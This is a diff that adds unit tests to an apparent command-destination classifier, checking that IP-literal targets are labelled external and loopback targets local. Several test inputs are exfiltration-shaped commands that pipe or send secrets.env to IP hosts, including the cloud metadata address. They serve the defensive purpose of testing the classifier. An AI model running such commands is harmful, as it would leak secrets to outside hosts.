@@ -39,3 +39,73 @@ def test_plain_filenames_are_not_mistaken_for_hosts():
     # bare hostnames just because they contain a dot.
     assert "local" in extract_destinations("rm -f build.log")
     assert "local" in extract_destinations("cat notes.txt")
+
+
+# --- IP-literal destinations (fix round 1) ---------------------------------
+#
+# Bare IP arguments to an unrecognized binary used to fall all the way
+# through to "local" — no NET_BINARIES match, no BARE_HOST match (that
+# regex only recognizes TLD-shaped suffixes, and an IP octet isn't one).
+# That is precisely the silent-leak shape this module exists to prevent:
+# `mytool 192.168.1.5 < secrets.env` shipped a file to a private-network
+# host and the parser said "local". Each test below is named for the
+# classification it locks in, not the input, per the fix request.
+
+def test_bare_ipv4_target_is_external():
+    assert "external_net" in extract_destinations(
+        "mytool 192.168.1.5 < secrets.env")
+
+
+def test_ipv4_target_with_port_is_external():
+    assert "external_net" in extract_destinations(
+        "exfil --to 10.0.0.9:9999 secrets.env")
+
+
+def test_bare_ipv6_target_is_external():
+    assert "external_net" in extract_destinations(
+        "mytool 2001:db8::5 < secrets.env")
+
+
+def test_bracketed_ipv6_target_with_port_is_external():
+    assert "external_net" in extract_destinations(
+        "exfil --to [2001:db8::5]:9999 secrets.env")
+
+
+def test_loopback_ipv4_target_is_local():
+    # 127.0.0.0/8 never leaves this machine.
+    assert "local" in extract_destinations("mytool 127.0.0.1 < secrets.env")
+
+
+def test_loopback_ipv6_target_is_local():
+    # ::1 never leaves this machine.
+    assert "local" in extract_destinations("mytool ::1 < secrets.env")
+
+
+def test_bracketed_loopback_ipv6_with_port_is_local():
+    assert "local" in extract_destinations(
+        "exfil --to [::1]:9999 secrets.env")
+
+
+def test_localhost_hostname_is_local():
+    assert "local" in extract_destinations(
+        "mytool localhost < secrets.env")
+
+
+def test_cloud_metadata_ip_is_never_local():
+    # 169.254.169.254 is link-local, not loopback — and it's the standard
+    # cloud-instance metadata endpoint, a well-known exfil/SSRF target.
+    # Link-local as a class must not be waved through as "local".
+    assert "external_net" in extract_destinations(
+        "mytool 169.254.169.254 < secrets.env")
+
+
+def test_rfc1918_private_ip_is_external():
+    # Private-range addresses still leave this machine's network stack —
+    # "private" is not "local" for our purposes.
+    assert "external_net" in extract_destinations(
+        "mytool 172.16.5.5 < secrets.env")
+
+
+def test_ip_literal_destination_is_listed_for_display():
+    assert "10.0.0.9:9999" in destination_hosts(
+        "exfil --to 10.0.0.9:9999 secrets.env")
